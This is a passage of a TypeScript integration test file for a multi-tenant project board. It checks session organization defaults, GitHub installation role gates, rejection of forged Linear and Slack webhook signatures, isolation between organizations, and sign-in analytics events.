 * activeOrganizationId lives on the session, and only the console's
 * create-team screen ever called setActive: the very first session had
 * an organization and every later sign in had none. A session with no
 * organization sees an empty board and is told to "ask an organization
 * admin" by the GitHub dialog, with the owner asking themselves. The
 * session-create hook now stamps each new session with the user's
 * first membership, whatever the sign-in method.
 */
test("a fresh sign in lands in the user's organization", async () => {
  const signUp = await jsonPost("/api/auth/sign-up/email", {
    email: "returning@bento.test",
    password: "correct-horse-battery",
    name: "Returning Owner",
  });
  const firstToken = signUp.headers.get("set-auth-token")!;

  const orgRes = await jsonPost(
    "/api/auth/organization/create",
    { name: "Returning Inc", slug: "returning-inc" },
    firstToken,
  );
  const org = (await orgRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, firstToken);

  const created = await jsonPost("/api/projects", { name: "The board", localPath: "/tmp" }, firstToken);
  assert.equal(created.status, 201);

  // A second sign in mints a new session. Nothing calls set-active for
  // it; the hook has to have done the equivalent already.
  const signIn = await jsonPost("/api/auth/sign-in/email", {
    email: "returning@bento.test",
    password: "correct-horse-battery",
  });
  assert.equal(signIn.status, 200);
  const secondToken = signIn.headers.get("set-auth-token")!;

  const listed = (await (
    await app.request("/api/projects", { headers: { authorization: `Bearer ${secondToken}` } })
  ).json()) as { name: string }[];
  assert.equal(listed.length, 1, "the returning session must see the team's board, not an empty one");
  assert.equal(listed[0]?.name, "The board");

  const status = (await (
    await app.request("/api/github/status", { headers: { authorization: `Bearer ${secondToken}` } })
  ).json()) as { canManage: boolean };
  assert.equal(status.canManage, true, "the owner must not be told to ask an organization admin");
});

/**
 * A project can start without a repository.
 *
 * On a hosted install the person naming a project is often not the one
 * who can connect the GitHub App, and requiring a repository at
 * creation chained the two: an organization with no installation could
 * not create a project at all. The name is enough; checkouts arrive
 * later through the repositories panel.
 */
test("a project can be created before any repository is connected", async () => {
  const signUp = await jsonPost("/api/auth/sign-up/email", {
    email: "repoless@bento.test",
    password: "correct-horse-battery",
    name: "Repoless Owner",
  });
  const token = signUp.headers.get("set-auth-token")!;
  const orgRes = await jsonPost(
    "/api/auth/organization/create",
    { name: "Repoless Inc", slug: "repoless-inc" },
    token,
  );
  const org = (await orgRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);

  const created = await jsonPost("/api/projects", { name: "Before GitHub" }, token);
  assert.equal(created.status, 201);
  const project = (await created.json()) as { id: string; localPath: string | null };
  assert.equal(project.localPath, null, "no checkout is mirrored because none exists yet");

  const repos = (await (
    await app.request(`/api/projects/${project.id}/repositories`, {
      headers: { authorization: `Bearer ${token}` },
    })
  ).json()) as unknown[];
  assert.deepEqual(repos, [], "the project starts with an empty repositories list");
});


/**
 * Adopting an existing installation is the request-flow's second half:
 * a GitHub owner approved the request on GitHub, so no callback ever
 * reached us, and connect binds it after the fact. The GitHub side
 * cannot run in a test; the gates in front of it can, and they are
 * what keeps one tenant from adopting another's installation.
 */
test("adopting a GitHub installation is gated to admins of a configured deployment", async () => {
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "adopt-owner@bento.test",
    password: "correct-horse-battery",
    name: "Adopt Owner",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const orgRes = await jsonPost(
    "/api/auth/organization/create",
    { name: "Adopt Inc", slug: "adopt-inc" },
    ownerToken,
  );
  const org = (await orgRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, ownerToken);

  // An owner is allowed through the role gate and stops at the missing
  // App: this deployment has no GitHub App configured.
  const listed = await app.request("/api/github/installations", {
    headers: { authorization: `Bearer ${ownerToken}` },
  });
  assert.equal(listed.status, 503);
  const connected = await jsonPost("/api/github/connect", { installationId: "12345" }, ownerToken);
  assert.equal(connected.status, 503);

  // A plain member is refused at the role gate, before configuration
  // is even consulted.
  const memberUser = await jsonPost("/api/auth/sign-up/email", {
    email: "adopt-member@bento.test",
    password: "correct-horse-battery",
    name: "Adopt Member",
  });
  const memberToken = memberUser.headers.get("set-auth-token")!;
  const inviteRes = await jsonPost(
    "/api/auth/organization/invite-member",
    { email: "adopt-member@bento.test", role: "member", organizationId: org.id },
    ownerToken,
  );
  const invite = (await inviteRes.json()) as { id: string };
  await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, memberToken);
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, memberToken);

  const memberList = await app.request("/api/github/installations", {
    headers: { authorization: `Bearer ${memberToken}` },
  });
  assert.equal(memberList.status, 403);
  const memberConnect = await jsonPost("/api/github/connect", { installationId: "12345" }, memberToken);
  assert.equal(memberConnect.status, 403);
});

test("the Linear webhook demands a valid signature", async () => {
  // No connection yet: the endpoint must refuse rather than process.
  const body = JSON.stringify({
    type: "Issue",
    action: "create",
    data: { id: "issue-1" },
    webhookTimestamp: Date.now(),
  });
  const missing = await app.request("/api/webhooks/linear/local", { method: "POST", body });
  assert.equal(missing.status, 503);

  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "linear-hook@bento.test",
    password: "correct-horse-battery",
    name: "Hook",
  });
  assert.equal(signup.status, 200);
  const [hookUser] = await ctx.db.select({ id: user.id }).from(user).where(eq(user.email, "linear-hook@bento.test"));
  assert.ok(hookUser);

  const secret = "hook-secret";
  await ctx.db.insert(linearConnections).values({
    ownerId: hookUser.id,
    organizationId: null,
    encryptedApiKey: ctx.secretBox.encrypt("lin_api_test"),
    encryptedWebhookSecret: ctx.secretBox.encrypt(secret),
    webhookId: "wh-1",
  });
  try {
    const forged = await app.request("/api/webhooks/linear/local", {
      method: "POST",
      body,
      headers: { "linear-signature": createHmac("sha256", "wrong").update(body).digest("hex") },
    });
    assert.equal(forged.status, 401);

    const signed = await app.request("/api/webhooks/linear/local", {
      method: "POST",
      body,
      headers: { "linear-signature": createHmac("sha256", secret).update(body).digest("hex") },
    });
    assert.equal(signed.status, 200);
    assert.deepEqual(await signed.json(), { ok: true, matched: 1 });
  } finally {
    await ctx.db.delete(linearConnections);
  }
});

test("Slack status is unconfigured without app credentials", async () => {
  const signup = await jsonPost("/api/auth/sign-up/email", {
    email: "slack-status@bento.test",
    password: "correct-horse-battery",
    name: "Slack",
  });
  assert.equal(signup.status, 200);
  const token = signup.headers.get("set-auth-token")!;
  await jsonPost("/api/auth/organization/create", { name: "Slack Co", slug: "slack-status-co" }, token);
  const status = await app.request("/api/slack/status", {
    headers: { authorization: `Bearer ${token}` },
  });
  assert.equal(status.status, 200);
  assert.deepEqual(await status.json(), {
    configured: false,
    connected: false,
    canManage: true,
    teamName: null,
    defaultProjectId: null,
    eventsUrl: "http://localhost:4400/api/webhooks/slack/events",
    interactivityUrl: "http://localhost:4400/api/webhooks/slack/interactive",
  });
  const install = await jsonPost("/api/slack/install", {}, token);
  assert.equal(install.status, 503);
});

test("the Slack webhook demands a valid signature", async () => {
  const body = JSON.stringify({ type: "url_verification", challenge: "abc" });
  const missing = await app.request("/api/webhooks/slack/events", { method: "POST", body });
  assert.equal(missing.status, 503);

  const mutableEnv = ctx.env as typeof ctx.env & { SLACK_SIGNING_SECRET?: string };
  const original = mutableEnv.SLACK_SIGNING_SECRET;
  mutableEnv.SLACK_SIGNING_SECRET = "slack-signing-secret";
  const ts = String(Math.floor(Date.now() / 1000));
  try {
    const forged = await app.request("/api/webhooks/slack/events", {
      method: "POST",
      body,
      headers: {
        "x-slack-request-timestamp": ts,
        "x-slack-signature": `v0=${createHmac("sha256", "wrong").update(`v0:${ts}:${body}`).digest("hex")}`,
      },
    });
    assert.equal(forged.status, 401);

    const signed = await app.request("/api/webhooks/slack/events", {
      method: "POST",
      body,
      headers: {
        "x-slack-request-timestamp": ts,
        "x-slack-signature": `v0=${createHmac("sha256", "slack-signing-secret").update(`v0:${ts}:${body}`).digest("hex")}`,
      },
    });
    assert.equal(signed.status, 200);
    assert.deepEqual(await signed.json(), { challenge: "abc" });

    const interactiveBody = "payload=%7B%7D";
    const forgedInteractive = await app.request("/api/webhooks/slack/interactive", {
      method: "POST",
      body: interactiveBody,
      headers: {
        "x-slack-request-timestamp": ts,
        "x-slack-signature": `v0=${createHmac("sha256", "wrong").update(`v0:${ts}:${interactiveBody}`).digest("hex")}`,
      },
    });
    assert.equal(forgedInteractive.status, 401);

    const queued: { name: string; data: unknown }[] = [];
    const realSend = ctx.boss.send.bind(ctx.boss);
    ctx.boss.send = (async (name: string, data?: object | null) => {
      queued.push({ name, data });
      return "job-id";
    }) as typeof ctx.boss.send;
    try {
      const payload = JSON.stringify({
        type: "block_actions",
        user: { id: "U1", team_id: "T1" },
        container: { channel_id: "C1" },
        actions: [{
          action_id: "pick_project",
          block_id: "=rewritten",
          selected_option: {
            value: "11111111-1111-1111-1111-111111111111:22222222-2222-2222-2222-222222222222",
          },
        }],
      });
      const pickBody = `payload=${encodeURIComponent(payload)}`;
      const pickTs = String(Math.floor(Date.now() / 1000));
      const picked = await app.request("/api/webhooks/slack/interactive", {
        method: "POST",
        body: pickBody,
        headers: {
          "x-slack-request-timestamp": pickTs,
          "x-slack-signature": `v0=${createHmac("sha256", "slack-signing-secret").update(`v0:${pickTs}:${pickBody}`).digest("hex")}`,
        },
      });
      assert.equal(picked.status, 200);
      assert.deepEqual(queued, [{
        name: "slack.inbound",
        data: {
          kind: "pick_project",
          teamId: "T1",
          channelId: "C1",
          userId: "U1",
          pendingId: "11111111-1111-1111-1111-111111111111",
          projectId: "22222222-2222-2222-2222-222222222222",
        },
      }]);

      queued.length = 0;
      const buttonPayload = JSON.stringify({
        type: "block_actions",
        user: { id: "U1", team_id: "T1" },
        actions: [{
          action_id: "pick_project_22222222-2222-2222-2222-222222222222",
          value: "11111111-1111-1111-1111-111111111111:22222222-2222-2222-2222-222222222222",
        }],
      });
      const buttonBody = `payload=${encodeURIComponent(buttonPayload)}`;
      const buttonTs = String(Math.floor(Date.now() / 1000));
      const buttoned = await app.request("/api/webhooks/slack/interactive", {
        method: "POST",
        body: buttonBody,
        headers: {
          "x-slack-request-timestamp": buttonTs,
          "x-slack-signature": `v0=${createHmac("sha256", "slack-signing-secret").update(`v0:${buttonTs}:${buttonBody}`).digest("hex")}`,
        },
      });
      assert.equal(buttoned.status, 200);
      assert.deepEqual(queued, [{
        name: "slack.inbound",
        data: {
          kind: "pick_project",
          teamId: "T1",
          channelId: "",
          userId: "U1",
          pendingId: "11111111-1111-1111-1111-111111111111",
          projectId: "22222222-2222-2222-2222-222222222222",
        },
      }]);
    } finally {
      ctx.boss.send = realSend;
    }
  } finally {
    if (original === undefined) delete mutableEnv.SLACK_SIGNING_SECRET;
    else mutableEnv.SLACK_SIGNING_SECRET = original;
  }
});

/**
 * The catalog is public data, but the "added" flag beside each entry is
 * not: it says what this team already runs. One org's additions must
 * never show as added to another, or the list quietly reports a
 * neighbour's tooling.
 */
test("the catalog's added flag does not cross organizations", async () => {
  const one = await jsonPost("/api/auth/sign-up/email", {
    email: "cat-one@bento.test",
    password: "correct-horse-battery",
    name: "One",
  });
  const two = await jsonPost("/api/auth/sign-up/email", {
    email: "cat-two@bento.test",
    password: "correct-horse-battery",
    name: "Two",
  });
  const oneToken = one.headers.get("set-auth-token")!;
  const twoToken = two.headers.get("set-auth-token")!;
  for (const [slug, token] of [["cat-org-one", oneToken], ["cat-org-two", twoToken]] as const) {
    const org = (await (
      await jsonPost("/api/auth/organization/create", { name: slug, slug }, token)
    ).json()) as { id: string };
    await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);
  }
  const as = (token: string) => (path: string, init: RequestInit = {}) =>
    app.request(path, {
      ...init,
      headers: { "content-type": "application/json", authorization: `Bearer ${token}`, ...(init.headers ?? {}) },
    });

  const url = "https://catalog-shared.example.test/mcp";
  const added = await as(oneToken)("/api/mcp", {
    method: "POST",
    body: JSON.stringify({ name: "Shared", slug: "shared", url, authType: "none" }),
  });
  assert.equal(added.status, 201);

  // The catalog answers for both, and neither 500s when the registry is
  // absent in this harness; the flag is what is under test.
  const seenByTwo = await as(twoToken)("/api/mcp/catalog");
  assert.equal(seenByTwo.status, 200, "any member may browse the catalog");
  const body = (await seenByTwo.json()) as { entries: { url: string; added: boolean }[] };
  const leaked = body.entries.find((e) => e.url === url && e.added);
  assert.equal(leaked, undefined, "another organization's server must not read as added");
});

test("sign in and sign up outcomes reach PostHog, and a refusal reaches error tracking", async () => {
  const events: ServerEvent[] = [];
  const exceptions: { error: Error; properties?: Record<string, unknown> }[] = [];
  const analytics: Analytics = {
    capture: (event) => {
      events.push(event);
    },
    captureException: (error, _userId, _organizationId, properties) => {
      exceptions.push({ error: error as Error, properties });
    },
    shutdown: async () => {},
  };
  ctx.analytics = analytics;
  try {
    const signUp = await jsonPost("/api/auth/sign-up/email", {
      email: "outcome-metrics@bento.test",
      password: "correct-horse-battery",
      name: "Metrics",
    });
    assert.equal(signUp.status, 200);
    const created = ((await signUp.json()) as { user: { id: string } }).user.id;
    assert.equal(events.length, 1);
    assert.equal(events[0].event, "sign up succeeded");
    // A success belongs to the person it signed in.
    assert.equal(events[0].userId, created);
    assert.equal(events[0].properties?.method, "email");
    assert.equal(events[0].properties?.status, 200);
    assert.equal(exceptions.length, 0, "a success is not an error");

    const wrong = await jsonPost("/api/auth/sign-in/email", {
      email: "outcome-metrics@bento.test",
      password: "not-the-password",
    });
    assert.equal(wrong.status, 401);
    assert.equal(events.length, 2);
    assert.equal(events[1].event, "sign in failed");
    // A failure has no user, so it counts against the server.
    assert.equal(events[1].userId, null);
    assert.equal(events[1].properties?.method, "email");
    assert.equal(events[1].properties?.code, "INVALID_EMAIL_OR_PASSWORD");
    assert.equal(events[1].properties?.status, 401);
    // Nothing that identifies the person rides along.
    assert.equal(JSON.stringify(events[1]).includes("outcome-metrics"), false);
    assert.equal(exceptions.length, 1);
    assert.equal(exceptions[0].error.name, "AuthFailureError");
    assert.equal(exceptions[0].properties?.$exception_fingerprint, "sign in failed:email:INVALID_EMAIL_OR_PASSWORD");

    const right = await jsonPost("/api/auth/sign-in/email", {
      email: "outcome-metrics@bento.test",
      password: "correct-horse-battery",
    });
    assert.equal(right.status, 200);
    assert.equal(events[2]?.event, "sign in succeeded");
    assert.equal(events[2]?.userId, created);

    // The OAuth callback names nobody in its redirect, so the user is
    // read back out of the session cookie the response set. The email
    // sign in sets the same cookie, which makes it the stand-in here.
    assert.equal(await userFromSessionCookie(ctx.auth!)(right), created);

    const duplicate = await jsonPost("/api/auth/sign-up/email", {
      email: "outcome-metrics@bento.test",
      password: "correct-horse-battery",
      name: "Metrics",
    });
    assert.equal(duplicate.status, 422);
    assert.equal(events[3]?.event, "sign up failed");
    assert.equal(events[3]?.properties?.code, "USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL");
    assert.equal(exceptions.length, 2);
  } finally {
    delete ctx.analytics;
  }
});
